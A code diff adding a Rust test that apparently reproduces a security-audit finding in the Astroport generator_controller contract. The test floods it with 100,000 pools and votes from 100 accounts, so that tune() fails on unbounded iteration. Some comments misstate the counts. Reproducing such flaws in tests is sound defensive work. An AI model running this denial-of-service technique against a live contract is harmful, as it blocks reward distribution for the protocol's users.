@@ -15,6 +15,59 @@ use astroport_tests::{
 use generator_controller::state::TuneInfo;
 
 #[test]
+fn test_jam_tuning() {
+    // reproduced in contracts/generator_controller/tests/integration.rs
+    let mut router = mock_app();
+    let owner = "owner";
+    let owner_addr = Addr::unchecked(owner);
+    let helper = ControllerHelper::init(&mut router, &owner_addr);
+    let mut pools_to_vote: Vec<(String, u16)> = vec![];
+    // attacker creates 1000 child contracts that implements the Minter{}
+    // the MinterResponse.minter query points to the parent contract implements
+
+    for _ in 0..100000 {
+        let pool = helper
+            .create_pool_with_tokens(&mut router, &"FOO", &"BAR")
+            .unwrap();
+        let pool_to_vote = (pool.to_string(), 1000_u16);
+        pools_to_vote.push(pool_to_vote);
+    }
+    assert_eq!(pools_to_vote.len(), 100000);
+    // attacker create 100 accounts and stakes for voting power
+    let mut attacker_accounts: Vec<String> = vec![];
+    for i in 0..100 {
+        let s = String::new() + "user" + &i.to_string();
+        attacker_accounts.push(s.clone());
+        helper.escrow_helper.mint_xastro(&mut router, &s, 1000);
+        helper
+            .escrow_helper
+            .create_lock(&mut router, &s, 2 * WEEK, 100f32)
+            .unwrap();
+    }
+    // 100 accounts each vote for 10 pools (hopefully its realistic enough)
+    let per_account = pools_to_vote.len() / attacker_accounts.len();
+    let mut pool_iter = pools_to_vote.clone().into_iter();
+    for acc in attacker_accounts {
+        let to_vote: Vec<_> = pool_iter.by_ref().take(per_account).collect();
+        helper.vote(&mut router, &acc, to_vote.clone()).unwrap();
+    }
+    // ensure all 1000 pools are recorded in contract
+    assert_eq!(pool_iter.len(), 0);
+    /*
+    - Try to tune pool, since all POOLS are fetched without limit, an attacker
+    can cause it to fail
+    // contracts/generator_controller/src/contract.rs:399
+    let pool_votes: Vec<_> = POOLS
+    .keys(deps.as_ref().storage, None, None, Order::Ascending)
+    .collect::<Vec<_>>()
+    .into_iter()
+    .map()
+    */
+    router.next_block(WEEK * 2);
+    helper.tune(&mut router).unwrap();
+}
+
+#[test]
 fn update_configs() {
     let mut router = mock_app();
     let owner = Addr::unchecked("owner");
